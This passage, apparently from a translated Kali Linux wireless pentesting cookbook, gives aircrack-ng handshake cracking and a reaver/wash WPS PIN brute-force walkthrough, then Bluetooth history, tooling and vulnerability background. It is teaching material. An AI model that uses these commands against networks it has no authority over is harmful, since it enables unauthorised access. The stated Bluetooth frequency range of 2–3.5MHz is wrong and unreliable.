将客户端从网络中踢出，以便客户端再次尝试连接 Wi-Fi。在那时，我们将捕获从客户端发送的数据包。从这个结果，我们将得到一个 WPA 握手。

现在我们应该开始破解 Wi-Fi。用于捕获数据包的命令是：

```
 aircrack-ng -b [bssid of router] -w [path to word list] 
    [path to capture packets] 
```

`-w`是单词列表的路径。在我的情况下，它是`/root/Desktop/wordlist.txt`。

如果你没有单词列表，你可以通过下载一个或使用 Kali Linux 内置的一个来获得一个。

现在按*Enter*。`aircrack`将开始破解 Wi-Fi 并找到一个密钥。

# 攻击 WPS

本章中我们下一个攻击的目标是被称为 WPS 或 Wi-Fi 保护设置的技术。这项技术在十多年前被引入，旨在简化客户端连接到无线网络的配置。这些功能实际上是针对消费者和那些没有 IT 背景的人，或者那些有 IT 背景但只是希望购买一台计算机或其他设备，按几个按钮就能连接到无线网络的人。如果我们只考虑这种能力或功能，那么 WPS 实际上已经相当有效地完成了它的工作。然而，存在安全风险，这就是为什么我们在这个特定的教程中谈论它并学习如何利用它的原因。但在我们深入讨论之前，让我们再深入了解一下 WPS 的机制，以便更好地准备这个教程。

只有当路由器和 Wi-Fi 客户端都支持该技术时，WPS 才能起作用。在讨论 WPS 时，还要记住的一点是，尽管 Wi-Fi 联盟已经尽最大努力确保 WPS 在各个供应商及其各自的设备上都是标准化的，但也有一些情况是两个不同供应商的设备上的技术不兼容。然而，重要的是要记住，现代设备不仅包括接入点，还包括智能手机、平板电脑和笔记本电脑，以及支持这一功能的操作系统，几乎没有互操作性问题。

为了讨论 WPS，让我们首先设想一个场景，在这个场景中我们希望使用 WPS。想象一下一个网络，它在个人配置中使用 WPA 或 WPA2，而不是企业配置。在这种情况下，我们会在接入点中输入一个密钥，然后与希望连接到该接入点的任何客户端分享，以便他们可以进行身份验证并加密其流量。正如我们在之前的教程中讨论的那样，如果您想使用这种设置，或者在您的环境中已经设置了这种设置，这意味着您在接入点上输入的密钥现在必须手动传输到每个客户端，然后他们就能连接到无线网络并进行业务。这就是 WPS 试图解决的场景。WPS 技术试图简化这个过程，以便通过简单按下一个按钮来配置密钥。

要记住的一点是，WPS 不适用于已废弃的技术，只适用于 WPA 或其后继者。具体来说，这意味着 WPS 在任何情况下都不会与 WEP 一起使用，因此如果您的路由器不支持比 WEP 更新的任何功能，它就不会具有这个功能。如果您的路由器支持 WPA 或其后继者，但是在 WPS 刚刚被引入的时期就推出，那么它也可能不支持 WPS。这些路由器可能仍然存在，或者存在于您的环境中。

在这种设置中，试图共享密钥的用户需要执行一些任务才能输入密钥。首先，他们将进入接入点，并根据所选择的协议的规则输入密钥。然后他们将去每个设备，并打开他们的无线客户端，并选择他们希望连接的无线网络；在这种情况下，是他们用密钥配置的那个。一旦他们通过点击选择了网络，客户端将发送一个请求连接到无线网络，然后无线网络将发出一个挑战，并提示用户输入密钥，然后用户将输入密钥。对于那些技术不熟练或稍微不适应这个过程的人来说，问题很多。最大的问题之一是他们可能输入错误的密钥，必须重新进行整个过程，无疑，他们会检查接入点以确保他们实际上得到了正确的密钥，这将导致一些人感到沮丧和冗长的配置过程。

根据 Wi-Fi 联盟提出的规范，WPS 以多种不同的方式工作。让我们来看看一些可以使用的方法。

+   我们可以使用 WPS 的第一种方法是简单地按下路由器上的 WPS 按钮，这将启动新设备的发现。在这一点上，您将转到您的设备，然后从您的无线客户端中选择您希望连接到的网络。在这一点上，设备将自动连接到无线网络，而无需输入密码或密钥。下面的照片显示了路由器上的 WPS 按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/31826a88-5b6f-4742-9847-536e342a776d.jpg)

路由器上的 WPS 按钮。

+   下一种方法是当您有无线设备，如打印机或范围扩展器，它们有自己的 WPS 按钮，用于快速连接到这些设备。当您需要将这些设备连接到无线网络时，您将按下路由器上的 WPS 按钮，然后按下您希望连接到无线网络的每个设备上的 WPS 按钮。在这个过程中，您不需要输入任何数据或其他内容，因为设备将自行完成握手并进行信息通信。一旦过程完成，除非您更改密码或以某种方式重新配置网络，否则您将不必再使用 WPS，因为设备将自行记住 WPS 凭据。下面的图像显示了一个带有 WPS 按钮的 Wi-Fi 范围扩展器。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/ec4f9871-b198-4916-8680-1087eb66e118.jpg)

带有 WPS 的 Wi-Fi 范围扩展器

+   使用 WPS 的另一种方法是通过使用八位数的 PIN 码。任何具有或使用 WPS 的路由器都将自动生成并且用户无法更改的 PIN 码。这个 PIN 码通常在手册的配置页面上或路由器本身上，并且应该被记录下来。在某些情况下，仍然具有 WPS 支持的 WPS 按钮设备将要求输入 PIN 码，因此记录这一信息非常重要。在这些情况下，当您尝试连接到无线网络时，系统将提示您输入代码，当您输入代码后，设备将连接到无线网络并执行交换适当的密钥的过程。

+   最后，还有一种方法可以使用，也是使用八位数的 PIN 码在 WPS 配置过程中验证客户端。对于没有 WPS 按钮但是支持 WPS 的设备，将生成一个特定的客户端 PIN 码。在这种情况下，您将把这个 PIN 码输入到路由器的无线配置选项中。路由器将使用它来识别正在添加的设备，然后将其添加到网络并像以前一样交换密钥。

就性能而言，列表中的前两种方法非常迅速，最具吸引力，更有可能受到不熟悉技术的消费者的青睐。最后两种方法最慢，最后一种选项是所有四种可用选项中最慢的，因为在设备中的任何过程得到验证之前，需要登录路由器并进行一些配置。还值得注意的是，并不需要供应商在其技术中实现 WPS 来实现所有四种方法。他们可以选择启用这些方法中的任何一种。

作为对这次讨论的一个注解，可能会遇到另一种与路由器同步或共享 WPS PIN 码的方法。这种方法使用 NFC 或近场通信。在这种情况下，希望连接到无线网络的客户端将拿起他们的平板电脑或智能手机，在路由器上挥动一下，路由器将读取代码并允许设备与网络同步。所使用的方法类似于您使用 Apple Pay 或 Android Pay 等技术时使用的技术，只需在收银台上挥动设备，付款就完成了。

几乎所有现代路由器都支持 WPS，因为这是绝大多数无线网络的核心组件，特别是在家庭或小型企业等消费者空间。由于这些是核心组件，支持这种网络安全标准是必不可少的。在许多路由器上，您甚至会发现 WPS 技术默认启用，并且在路由器上电并加入网络后即可使用。在某些情况下，您必须通过直接进入无线路由器并使用界面中的选项来手动启用 WPS，但在大多数情况下，您必须手动关闭该功能，因为通常默认情况下是开启的。

关于路由器中 WPS 支持的一个小注解是，许多路由器不仅启用了 WPS 支持，而且要想关闭它几乎是不可能的，除非非常困难。在一些路由器上，您可能需要禁用路由器上可用的其他功能，才能仅仅禁用 WPS 本身。例如，在一些无线接入点上，您可能需要禁用主要无线网络，而选择访客网络作为您的主要网络。在其他无线网络中，如果关闭网络的 SSID 广播等操作，访问点将允许启用 WPS。然而，在后一种情况下，这可能不是您想要做的事情。如果选择这样做，始终查看您的接入点以了解如何禁用 WPS。

就操作系统中的 WPS 支持而言，几乎所有操作系统都几乎普遍支持和包含该功能。在微软的情况下，自 2007 年以来，Windows WPS 在每个操作系统发布版本中都得到支持，基本上从 Windows Vista 开始。在安卓方面，自 2011 年以来，安卓 4.0 冰淇淋三明治版本就完全支持 WPS。自那个版本以来，每个安卓版本都完全支持 WPS。在诸如 Linux 之类的操作系统中，几乎所有版本都支持 WPS，但也有一些版本由于开发人员的原因而不支持或被禁用，但总体上在大多数情况下操作系统中都支持该功能。这让我们来看看苹果家族的操作系统，无论是他们的计算机还是使用 iOS 的任何设备，在这种情况下，我们没有 WPS 的本地支持；它只能通过第三方的附加组件或其他增强功能来使用。

以下截图显示了 Windows 7 中的 WPS 对话框：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/1032813c-b09e-4a4d-8418-2b1b073dd9f2.jpg)

Windows 7 中的 WPS 对话框

现在我们知道了 WPS 是什么，让我们讨论一下它的问题，然后再进入专门设计来打败这项技术的具体方法。WPS 标准存在一些问题，我们将看看这些问题对我们作为评估这项技术的人意味着什么：

+   WPS 的一个最大问题是，如果有人可以物理接触路由器，他们可以简单地把路由器翻过来拍照；在许多情况下，路由器上的标签上会有一个代码，允许对 WPA2 密码进行覆盖。以下图表显示了一个带有标签的路由器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/f85f0f61-b977-4230-b215-2a5291f7d043.png)

包括 PIN 码的标签

+   在许多路由器中，WPS 协议的使用不能轻易地被禁用，如果你将来不打算使用它，你无法采取基本的安全措施来关闭它。

+   另一个大问题是 WPS 的实现方式，由于协议交换了一个八位字符的 PIN 码，并且它的存储方式存在一些问题。不去深究所有的细节，基本上这个八位数字的 PIN 码被分成两个四位数字块，它们在客户端和接入点之间进行交换。由于这个代码在客户端和接入点之间的检查方式，没有一个强大的系统来验证这个代码。由于这个代码被分成两个块以及之后这个过程的行为方式，攻击者可以很容易地使用软件来猜测正确的 PIN 码。事实上，为了简化事情并且远离整个过程的数学，由于 PIN 码的验证方式，我们发现有可能只用 5500 次猜测就能得到正确的代码，这对现代计算机来说很容易。在 Kali 中，我们发现有软件可以让我们很快、高效地进行 11,000 次猜测，而我们几乎不需要付出努力。

如果你是一个正在计算这个问题并试图弄清楚可能的 PIN 码组合数量的人，你可能得到的数字比这个文本中所述的要大得多。事实上，如果你考虑到 PIN 码只允许在 PIN 码的八个槽中使用零到九这些数字，你可能会得出大约 1 亿个可能的代码组合。然而，事实并非如此。

首先，我们甚至没有八位数字的 PIN 码，因为最后一位数字被用作校验和或验证代码是否已正确传输且没有缺陷。所以我们只剩下七位数字。然而，问题在于，尽管七位数字不被视为一个连续的数字；实际上它被分成两部分。Wi-Fi 设备将发送路由器前四位数字进行验证，然后单独发送最后三位进行验证。如果我们在这个级别进行计算，我们会发现四位数字有 1 万种不同的组合，而三位数字有 1,000 种不同的组合；如果我们把这两个数字加在一起，我们有 11,000 种可能的代码组合。如果我们再多做一点数学和使用一点逻辑，我们会发现更有可能的是攻击者可能需要猜测大约一半的代码，然后才能成功解决问题。这就是我们得到前面提到的 5,500 次猜测的原因。然而，如果我们想要进行穷举搜索所有可能的代码，这将是 11,000 种不同的组合，这仍然不是任何现代计算机无法克服的重大任务。

# 准备工作

为了开始工作，你需要准备以下物品：

+   能够进入监视模式的无线网卡

+   Kali Linux

这里列出的项目是基本要求，如果需要，您可以轻松地使用更多（或不同的）组件。例如，如果您想要增强范围，您可以使用一个带有外部天线连接的基于 USB 的无线网卡，这样可以获得更好的接收效果。

# 如何做...

在这个特定的步骤中，我们将通过一些步骤来破解使用弱密码的 WPA。

我们对 WPS 发动攻击的方式是使用一个熟悉的命令`airmon-ng`：

```
airmon-ng start wlan0 
```

再次将我们的卡置于监视模式以侦测该地区的无线网络。我们可以像对待 WEP 和 WPA/WPA2 一样跟进这个命令，使用`airodump-ng`，但我们将转而使用`reaver`套件并使用其内置命令。在这种情况下，我们将发出以下命令：

```
wash -i mon0 
```

这个命令是专门用来寻找使用 WPA 的网络的。运行命令后，您会得到类似以下的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/0b847af2-7138-434f-947b-47652ed02795.png)

wash 命令的结果

结果应该能够找到该地区的网络。显示的网络将包括周围的所有内容。其中可能有一些是易受攻击的。在结果中，您会注意到一个 WPS 锁定列；这远非一个确定的指标，但一般来说，您会发现列为未锁定的 AP 更有可能受到我们尝试的暴力攻击。您仍然可以尝试对 WPS 锁定的网络发动攻击，但成功的机会会大大减少。

一旦找到要对其发动攻击的网络，操作`reaver`非常简单。基本命令只需要指定本地接口、信道和 ESSID。

例如，对 mordred 网络发动`reaver`的命令将如下所示：

```
reaver -i mon0 -c 6 -b 00:23:69:48:33:95 -vv 
```

上述命令中唯一可能不太明显的部分是`-vv`；这将启用详细输出，这在尝试评估`reaver`的功能时非常有帮助。

一旦启动了`reaver`，您会开始看到类似这样的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/38cf3d81-d910-419d-8834-22aaeda34d6c.png)

这个输出显示 WPS PIN 已成功地针对目标进行了尝试（这里我们看到`12345670`和`00005678`正在被测试），并且`reaver`正常运行。

这个过程可能需要很长的时间，但您会看到反馈告诉您攻击正在进行并且正常运行。可能会减慢攻击的是许多供应商一直在尝试实施防御 WPS 攻击的保护措施，可能需要额外的选项来推动攻击。

幸运的是，`reaver`会自动保留一个进度日志文件，因此您可以随时停止攻击并在方便的时候恢复。每天花几个小时运行`reaver`对同一个网络进行攻击，应该能够找到它的 PIN 码，从而找到 WPA 密码。


# 第七章：蓝牙攻击

在这一章中，我们将涵盖以下食谱：

+   蓝牙的简史

+   蓝牙的运作

+   蓝牙的漏洞

+   选择蓝牙硬件

+   蓝牙干扰

+   蓝牙劫持

+   蓝牙技术

# 介绍

蓝牙是另一种流行且广泛使用的无线技术，已经有超过十年的历史了。它在我们使用的技术方面存在许多方面。然而，虽然我们许多人确实使用蓝牙设备和技术，但可能存在一些关于蓝牙具体是什么、它的设计目的以及它的工作原理的困惑或缺乏清晰度。由于攻击和破坏蓝牙和蓝牙设备在很大程度上取决于对技术工作原理的深入了解，因此我们实际上有必要了解一些关于技术背景以及技术是如何设计和实施的，以及它是如何产生的。出于这种精神，我们将从蓝牙的历史开始，了解它是如何应对它设计面临的挑战的。接下来将进行技术讨论，讨论蓝牙中存在的一些可以被利用的漏洞。因此，让我们从讨论蓝牙技术的历史和演变开始，然后再深入了解整个过程的机制。

# 蓝牙的简史

蓝牙技术最初是由瑞典电信公司爱立信发明和提出的。蓝牙的最初概念始于 1989 年，当时该公司的一群工程师决定或被要求提出一种能够在个人电脑和耳机之间传输和启用通信的短距离无线电技术。正是这种通过短距离无线电链接连接设备的核心概念推动了技术的发展，使其能够连接不仅仅是耳机和个人电脑，而是后来的各种类型的设备，就像我们今天看到的那样。

在 90 年代，随着个人数据助手或 PDA 等便携式技术的发展，人们构想了蓝牙的新概念和实现。使用这些早期 PDA 设备的技术爱好者，比如 Palm Pilot 的用户，希望能够连接到周围可用的不同设备。这些人希望能够使用短距离技术，走进一个房间并连接到打印机、扫描仪或其他服务和设备。正是因为这种愿望和动力，蓝牙很快被视为解决这个问题的方案。

那么蓝牙这个名字实际上是从哪里来的呢？好吧，万一你是那些之前没听过这个故事的人之一，让我简要地回忆一下。蓝牙这个名字是对 10 世纪丹麦国王哈拉尔德·布拉特兰的英语化翻译。这位国王因两个非常重要的特点而闻名 - 或者至少对我们来说很重要。首先，他以统一丹麦和挪威各族人民而闻名。其次，他因蓝牙而得到绰号，根据传说，他要么有一颗明显的坏牙，看起来是蓝色的，要么他的牙齿因大量食用蓝莓而染成了蓝色。后者是否属实很难说，但事实是蓝牙现在被用作这项技术的名称。原因是，就像国王一样，蓝牙技术被用来统一许多不同的技术，并允许它们使用一个标准规范进行交流和互操作。这意味着无论您的设备来自哪个供应商或其他来源，只要它遵守蓝牙标准，它就可以与另一个供应商的设备进行通信，几乎没有问题。

另一个有趣的注脚；蓝牙标志是国王哈拉尔德的姓名首字母的组合。以下图表显示了蓝牙标志是如何衍生出来的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/cb621e89-547e-443e-a2be-261338fe16df.jpg)

蓝牙标志的创作

当蓝牙首次亮相时，可以说是竞争对手的主要技术是红外线技术。红外线技术允许，或者应该允许，打印机和扫描仪等设备能够在短距离内无线通信。在 90 年代，红外线技术是笔记本电脑和打印机等设备的一个相当常见的附加功能。因此，如果蓝牙是新兴标准，而红外线已经存在于市场上，为什么红外线不再普遍存在，为什么没有蓝牙技术的替代品呢？嗯，这有一个答案，但有点复杂。与红外线等其他技术不同，蓝牙允许最多八个设备通过短距离无线电技术同时配对并形成一个网络来交换信息。事实上，在某些领域，蓝牙被称为个人区域网络技术，或 PAN。在这种设置中，每个配对的设备本质上都作为这个小型网络环境中的自己的节点。当然，为了实现这种互操作性，所有这些设备不仅必须具备蓝牙功能，而且它们必须使用标准化的通信协议，这就是蓝牙在这个方程中提供的。以下图表是 PAN 的概念：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/e5b37549-352e-405f-9a63-866127f246d4.png)

展示 PAN

讨论蓝牙时有趣的一点是，当它首次亮相时，蓝牙确实存在一些问题，就像任何新技术都会有的。在蓝牙的情况下，许多不同的供应商都迅速采用了蓝牙的想法，并赶紧将其实施到自己的产品线中并将这些产品推向市场。然而，这种匆忙也存在潜在的负面影响，在早期的蓝牙设备中表现得相当严重。在匆忙将蓝牙实施到他们自己的设备中时，制造商遇到了一个问题，即不同的蓝牙设备无法相互通信，即使它们被标记为蓝牙兼容。事实上，一些早期的蓝牙设备不仅无法与不同供应商的设备通信，甚至无法与同一供应商制造的设备通信。这带来了一些非常严重的问题；可以想象，消费者购买了声称与蓝牙兼容的设备，实际上它们各自实施了自己的蓝牙形式，与其他设备不兼容，消费者肯定不会满意。造成这种情况的主要原因是，当供应商匆忙将蓝牙技术实施到他们的产品中时，例如耳机，蓝牙标准尚未完全制定和商定，因此供应商不得不填补空白或调整他们认为应该的方式，并将结果标记为蓝牙。自那时起，技术已经得到了显著发展，困扰技术的早期问题已经消失，来自不同供应商的蓝牙设备现在可以快速而轻松地进行通信。

就技术而言，蓝牙标准与本书其余部分涉及的 Wi-Fi 技术有很多共同之处，但并非完全相同。最重要的一点是，就像 Wi-Fi 技术一样，蓝牙并不局限于任何一种产品或环境。蓝牙是一种通信标准，任何人都可以像使用 Wi-Fi 一样在任何技术中实现的。此外，蓝牙规范由蓝牙特别兴趣小组控制，这是一个负责保持标准更新以及控制和处理技术和商标许可的委员会，这些商标将被实施蓝牙的各种供应商使用。就像 Wi-Fi 一样，蓝牙也有许多标准；例如，在蓝牙 4.2 中，更新了功能集，使蓝牙在操作时消耗更少的电力，传输数据更快，并且比以前的版本提供了更好的安全性。蓝牙在过去几年中也发展，包括支持与人们在家中看到的新一代智能设备进行通信的能力，例如灯泡、开关、摄像头甚至恒温器。以下图表显示了蓝牙和智能家居背后的一些概念：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/2985a85f-b004-471e-b992-588a70403cf8.jpg)

蓝牙生态系统。

如果我们不至少在这里花点墨水来谈谈可能被视为竞争技术的东西，我们就会疏忽大意了，这就是所谓的 Zigbee。这项技术在十多年前首次亮相，旨在允许使用无线电信号进行数据传输，覆盖更长距离，如 100 米，同时消耗更少的电力。最初，这项技术的范围使得它对依赖蓝牙的人们很有吸引力，因为它提供了更远的传输距离，主要是因为蓝牙的有效范围为 10 米，而这项技术的范围为 100 米。然而，自 2006 年以来，蓝牙已经包括了减少功耗的能力作为其核心能力之一。蓝牙还具有利用特殊天线和发射器来实现更远距离传输信号的能力。以下图片显示了一个 Zigbee 设置的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/be245128-2125-4da3-8f86-e4c91cb44abb.jpg)

展示 Zigbee 设置。

如今，蓝牙已经轻松主导了短距离无线市场，并已经应用于从智能手机到平板电脑，再到各种家用电器和设备以及汽车等各种产品。正因为技术得到了如此广泛的应用，它对于希望找到进入组织或窃取信息的攻击者来说是一个非常诱人和可行的目标。

# 对技术的一瞥

因此，通过蓝牙的历史和演变，我们已经了解了这项技术的起源和在功能和设计方面的位置，让我们继续讨论蓝牙的技术规格以及它与我们的关系。 

蓝牙是一种设计在 2MHz 至 3.5MHz 之间运行的技术。您可能已经知道或记得，这是一个全球无许可证的频段，用于工业、科学和医疗用途，通常称为 ISM 2.4GHz 短距离无线电频段。蓝牙在这个频段内运行，并使用诸如跳频扩频等技术来调制信号。以下图表显示了 ISM 频段的位置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/c851de7e-491a-40ed-9d5f-021c87aef470.jpg)

ISM 频段

当蓝牙传输信息时，它的工作方式类似于其他类型的网络，即通过将数据分成数据包，然后使用 79 个不同指定的蓝牙信道之一来传输每个数据包。每个信道都被分成 1MHz 的增量。在正常操作中，蓝牙每秒在 800 个信道之间跳跃。新一代的低功耗蓝牙设备利用 2MHz 的间隔，这意味着我们只有 40 个信道可以跳跃，而不是其前身使用的 79 个信道。

蓝牙的架构首先是基于数据包的，并且通过主从架构来传输信息和网络。这意味着我们有一个主设备，它与最多七个从设备在所谓的微型网中进行通信。主设备是所有设备都同步其时钟的设备，以确保传输正常工作和通信高效。为了简化，主设备负责保持网络中从设备的同步。此外，主设备可以在整个网络中传输所有数据。

在正常操作下，主蓝牙设备可以与其网络设置中的其他七个设备进行通信。正在建立的设置与 Wi-Fi 中的特设网络基本相同；在这种网络拓扑中没有固定的中心点。需要记住的是，虽然主设备是在与其他七个设备进行通信的设备，但并不总是必须有一个设备被固定或永久指定为主设备。事实上，设备可以随时在主设备和从设备之间切换。一个很好的例子是蓝牙耳机试图连接到手机。耳机实际上会作为主设备开始，因为它向智能手机或手机发起连接，但一旦连接建立，手机实际上控制通信，因此一旦切换完成，耳机就从主设备变为从设备。这可以通过任何蓝牙设置中的设备之间的协议来完成。

因此，让我们谈谈蓝牙中的具体数字，以便了解这些不同网络设计和设置的一些细节：

+   蓝牙 3.0 的最大速度为 25 MB，最大范围为 10 米或 33 英尺

+   蓝牙 4.0 的最大速度为 25 MB，最大范围为 60 米或 200 英尺

+   蓝牙 5.0 的最大速度为 50 MB，最大范围为 240 米或 800 英尺

在讨论蓝牙时需要记住的是，最大速度和范围可能会因存在的许多因素而发生显著变化。在范围的情况下，这里所述的数字将受到诸如天线设计或配置、电池电量和大气密度等条件的影响，这些条件可能会出现在较长的范围内，以及来自同一频率区域内其他设备的干扰。同样的条件也可能导致速度的损失或降低。无论如何，在最理想的条件下，你都不太可能达到任何特定蓝牙产品所宣称的速度和范围。

通过使用特殊适配器和天线，可以改变或修改蓝牙网络的范围，实际上许多这些设备都可以在第三方市场上获得。许多专用天线和设备之所以没有内置在大多数设备中，是因为对于大多数用户来说，增加的范围实际上并不是必需的，而且实际上会增加设备的成本。对于在短距离使用蓝牙的绝大多数消费者来说，蓝牙的短距离使用是理想的。

关于蓝牙与 Wi-Fi 的比较，你可能会问为什么使用其中一个而不是另一个，所以我们应该来看看。当我们看这两种技术时，我们可以看到它们非常相似，它们都用于共享信息、建立网络、打印、传输各种数据，甚至与其他设备和资源进行通信。在许多方面，蓝牙也解决了 Wi-Fi 在自己的环境中解决的有线问题，这里的区别在于我们谈论的有线是耳机和手机之间或打印机和计算机之间的有线。在 Wi-Fi 的情况下，我们谈论的是覆盖更大距离的有线。蓝牙也被设计为一种几乎不需要配置就可以有效使用的技术，而 Wi-Fi 在配置完成后需要更多的额外配置。值得注意的是，Wi-Fi 可以在自组网模式和基础设施模式下运行，但在蓝牙中，只有自组网模式；没有基础设施，因为没有蓝牙接入点。尽管蓝牙和 Wi-Fi 解决了两组不同的问题，并且在各自的环境中表现良好，但它们不应被视为竞争技术，而应被视为互补技术，因为它们可以很有效地共同工作。

# 蓝牙操作中

在正常操作下，蓝牙有一种非常特定的功能方式。我们提到了控制节点和客户节点之间的主从关系，以及它们如何来回切换，但这只是谜题的一部分。让我们来看看设备是如何学会彼此交流和交换信息的。

在蓝牙中，设备之间的通信是通过配对过程来实现的。配对是一种过程，其中一个设备设置为可被发现，意味着其他蓝牙设备可以扫描到它。扫描设备在找到可用的蓝牙设备后，将选择它作为要配对的对象。一旦选择完成，接下来发生的事情可能会有一点不同。在大多数情况下，主设备上会显示或记录一个验证代码，然后请求配对的设备必须确认此代码才能完成连接。在一些设备中，这个代码实际上是硬编码到设备中的，而在其他设备中，设备所有者可以自定义一个 PIN 码以增加安全性。无论哪种情况，一旦代码确认，就会假定这两个设备彼此认识，并且连接得到批准。以下图显示了蓝牙配对过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/7e92e05c-2834-4747-8633-e9a9010ece0e.png)

蓝牙配对过程

以下截图显示了一个配对请求屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-wrls-pentest-cb/img/caab592e-fdcc-4b92-8bc1-92749e8e69ab.png)

配对请求

关于蓝牙中的可发现性，这种模式旨在基本上广播设备的名称，就像 Wi-Fi 中的 SSID 一样。然而，在蓝牙中，可发现性不仅可以打开和关闭，还可以在有限的时间内打开。这意味着手机可以设置为在五分钟内可被发现，如果在这五分钟内没有进行配对，设备将自动从可发现状态转为不可发现状态。这是因为如果设备保持可发现状态，周围的其他设备可以扫描到它，这可能允许恶意方试图连接或甚至篡改您的设备。大多数现代蓝牙设备默认为在配对尝试发起时保持可发现状态一段有限的时间，通常持续几分钟后再转为不可发现状态。

因此，有了这些知识，让我们继续讨论蓝牙可能存在的不同类型的攻击。你会发现，这一章中的许多攻击在很多方面都类似于我们在普通 Wi-Fi 中看到的攻击类型，这是因为 Wi-Fi 和蓝牙之间存在一些相似之处 - 但请记住，它们并不百分之百相同。两者在机制上绝对不相同，但在概念上有相当多的相似之处，这将使得攻击看起来非常相似，尽管在两种技术之间实际执行会有所不同。这很好，因为这意味着这些概念对你来说会很熟悉，这将使你有更多时间专注于蓝牙技术中概念的实际机制和技术细节的实现。

在 Linux 中，蓝牙协议栈是通过一组称为 BlueZ 的库来实现的。像大多数 Linux 发行版一样，Kali 默认安装了它，不需要额外的操作来使其存在（尽管您可能希望运行更新以获取协议的最新修复和补丁）。

在 BlueZ 中存在许多不同的工具，用于管理和探索蓝牙的功能和能力。其中有一些特别有用：

+   `hciconfig`：这个工具在 Linux 中的操作方式类似于`ifconfig`，主要区别在于它是用于蓝牙设备的。

+   `hcitool`：这是一个查询工具。它可以为我们提供设备名称、设备 ID、设备类和设备时钟。

+   `hcidump`：这个工具使我们能够嗅探蓝牙通信。

这些不是 Kali 中唯一可以操作蓝牙的工具，以下列表包含了其他一些存在的工具：

+   **Bluelog**：一个蓝牙现场调查工具。它扫描区域以找到尽可能多的可发现设备，然后将它们记录到文件中。

+   **Bluemaho**：用于测试蓝牙设备安全性的基于 GUI 的工具套件。

+   **Blueranger**：一个简单的 Python 脚本，使用 I2CAP ping 来定位蓝牙设备并确定它们的大致距离。

+   **Btscanner**：这个基于 GUI 的工具扫描范围内的可发现设备。

+   **Redfang**：这个工具使我们能够找到隐藏的蓝牙设备。

+   **Spooftooph**：这是一个蓝牙欺骗工具。

# 蓝牙协议栈

蓝牙设备不需要使用协议栈中的所有协议（就像 TCP/IP 协议栈）。蓝牙协议栈被开发用于让各种通信应用程序使用蓝牙。通常，一个应用程序只会使用这个协议栈的一个垂直切片。蓝牙协议层及其相关协议如下列出：

+   **蓝牙核心协议基带**：LMP、L2CAP、SDP

+   **电缆替换协议**：RFCOMM

+   **电话控制协议**：TCS 二进制、AT 命令

+   **采用的协议**：PPP、UDP/TCP/IP、OBEX、WAP、vCard、vCal、IrMC、WAE

除了协议层，蓝牙规范还定义了一个**主机控制器接口**（**HCI**）。这提供了一个命令接口给基带控制器、链路管理器，并访问硬件状态和控制寄存器，因此前面提到的工具如`hciconfig`、`hcidump`和`hcitool`都是以此命名。

# 蓝牙漏洞

蓝牙技术已经表明自己既非常方便又强大，但同时也表明它有自己的一种漏洞类型，这在其他技术中并不常见，或者至少不是以同样的形式出现。由于蓝牙的运作方式和设计，存在新类型攻击的明显可能性，并且在这个环境中已经出现了一些这样的攻击。

最近，一个名为 BlueBorne 的攻击家族出现在市场上。这些攻击旨在针对蓝牙设备。这些攻击被证明是相当令人不安和令人担忧的，因为它们依赖于一种新的通信机制，而不是旧的通信机制。如果我们看传统的攻击，它们通过网络技术传播，包括互联网、有线网络甚至 Wi-Fi。然而，在蓝牙的情况下，我们有一种技术，可以促进非常小的网络，但相似之处很快几乎有效地减少。这类攻击家族是如此危险，以至于攻击者可能从利用的那一刻起就获得对设备的完全和绝对控制。导致这类攻击的严重性和危险性的因素是，安全社区只是刚刚开始探索蓝牙的危险和问题以及它可能被利用的潜在方式。

还有其他因素使这类攻击以及我们将在本章中探讨的攻击比其他环境中看到的更加危险。蓝牙攻击最危险的一个方面是，它能够通过空气迅速传播，这既是因为无线技术的普及，也是因为这些设备的安全性仍在不断发展，并且在许多情况下可能缺乏安全性。其次，最近在蓝牙中出现的许多攻击允许绕过设备上存在的任何安全措施，因此意味着攻击可以保持有效地不被检测到。另一个令人担忧的问题是，连接到传统网络的蓝牙设备也可能允许恶意方找到进入安全网络的后门，因为连接到常规网络并启用蓝牙的设备可能允许攻击者将这些设备用作入口。最后，真正需要考虑蓝牙的一个最大问题是，可以通过蓝牙连接将文件推送到目标设备上，并在用户根本不必点击链接或采取任何行动的情况下执行。

在蓝牙环境中出现的一些攻击与在其他环境中看到的攻击相似，包括 Wi-Fi。让我们快速看一下其中一些攻击和漏洞，并简要讨论如何对抗这些攻击和漏洞：

+   **软件漏洞**：这并不是蓝牙独有的问题，但它确实在暴露蓝牙不同的漏洞和问题方面发挥了作用。由于软件的复杂性和规模的本质，一个软件完全没有任何错误或问题是不可想象的。事实上，您在计算机或设备上运行的每个软件都有错误，只是问题在于这些个别漏洞或问题有多少以及有多严重。新的蓝牙实现，如蓝牙 4.0，以及更新的操作系统和驱动程序在解决已出现的漏洞方面已经取得了长足进展，但无疑也引入了新的漏洞。这就是为什么蓝牙设备的所有者应该跟踪可能发布的任何新更新，并查看是否有可能影响他们的威胁，并相应地处理它们。

